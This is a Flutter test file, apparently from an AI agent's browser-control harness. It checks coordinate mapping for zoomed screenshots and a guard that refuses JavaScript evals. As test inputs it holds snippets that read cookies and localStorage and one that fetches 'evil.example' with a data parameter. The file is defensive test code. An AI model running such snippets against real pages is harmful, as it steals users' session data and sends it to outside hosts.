import 'package:every_ai/features/code/harness/everyai/screen_tools_io.dart';
import 'package:every_ai/features/code/live/frames.dart';
import 'package:flutter_test/flutter_test.dart';

void main() {
  group('frames', () {
    const g = ViewGeometry(1280, 800);
    test('points map from the picture the model saw, zooms included', () {
      final book = FrameBook();
      final whole = book.record(imageWidth: 640, imageHeight: 400, geometry: g);
      final p = book.map(whole.id, 100, 50, g);
      expect((p.x, p.y), (200.0, 100.0));
      final zoom = book.record(
        imageWidth: 400,
        imageHeight: 200,
        geometry: g,
        region: (left: 100, top: 100, width: 200, height: 100),
      );
      expect(zoom.zoomed, isTrue);
      final z = book.map(zoom.id, 200, 100, g);
      expect((z.x, z.y), (200.0, 150.0));
      // No id: the latest frame.
      expect(book.map(null, 200, 100, g).x, 200.0);
    });
  });

  test('eval may not read cookies or storage, nor send to other sites', () {
    expect(evalRefusal('document.cookie', 'http://localhost:3000/'), contains('cookies'));
    expect(evalRefusal('localStorage.getItem("t")', 'http://localhost:3000/'), contains('storage'));
    expect(evalRefusal('fetch("https://evil.example/x?d=1")', 'http://localhost:3000/'), contains('evil.example'));
    expect(evalRefusal('fetch("/api/items").then(r => r.status)', 'http://localhost:3000/'), isNull);
    expect(evalRefusal('fetch("http://localhost:3000/api")', 'http://localhost:3000/'), isNull);
    expect(evalRefusal('document.title', 'http://localhost:3000/'), isNull);
  });
}
